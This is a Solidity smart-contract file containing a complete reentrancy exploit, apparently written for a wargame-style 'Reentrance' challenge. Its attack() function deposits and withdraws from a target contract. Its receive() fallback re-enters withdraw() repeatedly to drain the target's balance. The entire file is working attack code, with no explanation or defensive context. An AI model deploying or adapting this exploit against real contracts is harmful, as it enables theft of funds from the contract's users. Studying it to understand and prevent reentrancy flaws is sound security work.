pragma solidity ^0.6.12;

interface IReentrance {
    function donate(address _to) external payable;
    function withdraw(uint256 _amount) external;
}

contract ReentrancyExploitFinal {
    IReentrance public instance;

    constructor(address payable _instance) public {
        instance = IReentrance(_instance);
    }

    // Attack entry point
    function attack(uint256 amount) public payable {
        instance.donate{value: amount}(address(this));
        instance.withdraw(amount);
    }

    // Fallback function for reentrancy
    receive() external payable {
        if (address(instance).balance >= 1) {
            instance.withdraw(1);
        }
    }
}
